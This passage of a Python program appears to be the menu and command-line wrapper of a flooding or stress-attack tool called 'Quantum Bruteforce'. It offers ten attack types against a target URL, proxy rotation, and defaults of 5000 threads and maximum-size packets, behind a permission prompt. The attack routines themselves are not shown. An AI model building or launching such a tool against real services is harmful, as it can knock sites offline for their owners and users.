                if v in (1,4,5):
                    self.proxy_type = v
            except:
                pass
        elif choice == '5':
            f = input(f"{Fore.GREEN}Enter proxy file path: {Style.RESET_ALL}")
            if f:
                self.out_file = f
        elif choice == '6':
            self.verbose = not self.verbose
        elif choice == '7':
            self.config = {'max_threads':5000, 'packet_size':65507, 'timeout':5}
            self.proxy_type = 5
            self.out_file = 'files/proxys/socks.txt'
            self.verbose = False
            print(f"{Fore.GREEN}[+] Reset to defaults{Style.RESET_ALL}")
        elif choice == '8':
            return
        time.sleep(1)

    # --------------------- MAIN LOOP ---------------------
    def run(self):
        while True:
            choice = self.menu()
            if choice == 14:
                print(f"{Fore.GREEN}[+] Exiting Quantum Bruteforce...{Style.RESET_ALL}")
                self.running = False
                break
            elif choice == 11:
                self.show_stats()
                input(f"{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")
            elif choice == 12:
                self.configuration()
            elif choice == 13:
                self.tools_menu()
            elif 1 <= choice <= 10:
                self.start_attack(choice)
            else:
                print(f"{Fore.RED}[!] Invalid choice{Style.RESET_ALL}")
                time.sleep(1)

# -------------------- Command Line Entry --------------------
def main():
    parser = argparse.ArgumentParser(description="Quantum Bruteforce - Ultimate Stress Test")
    parser.add_argument('--target', help='Target URL (e.g., https://example.com:8080/path)')
    parser.add_argument('--port', type=int, help='Target port (overrides URL)')
    parser.add_argument('--threads', type=int, default=200, help='Threads')
    parser.add_argument('--duration', type=int, default=60, help='Duration in seconds')
    parser.add_argument('--type', type=int, choices=range(1,11), help='Attack type 1-10')
    parser.add_argument('--proxy', type=str, help='Proxy file (optional)')
    parser.add_argument('--verbose', action='store_true', help='Verbose output')
    args = parser.parse_args()

    print(f"""
{Fore.RED}+----------------------------------------------------------------------+
|                         LEGAL NOTICE                                 |
+----------------------------------------------------------------------+
|  This tool is for AUTHORIZED SECURITY TESTING only.                  |
|  Using it against unauthorised targets is ILLEGAL.                   |
|  You must have WRITTEN PERMISSION.                                   |
+----------------------------------------------------------------------+
{Style.RESET_ALL}""")
    confirm = input(f"{Fore.YELLOW}Do you have permission to test? (yes/NO): {Style.RESET_ALL}")
    if confirm.lower() != 'yes':
        print(f"{Fore.RED}[!] Operation cancelled.{Style.RESET_ALL}")
        return

    tool = QuantumBruteforce(args)
    if args.target:
        try:
            tool.parse_url(args.target)
            if args.port:
                tool.target_port = args.port
            tool.duration = args.duration
            tool.thread_count = args.threads
            tool.verbose = args.verbose
            if args.proxy:
                tool.out_file = args.proxy
                tool.get_proxies(tool.out_file)
            attack_type = args.type if args.type else 8
            tool.start_attack(attack_type)
        except Exception as e:
            print(f"{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
    else:
        tool.run()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Interrupted by user{Style.RESET_ALL}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Fore.RED}[!] Fatal error: {str(e)}{Style.RESET_ALL}")
        sys.exit(1)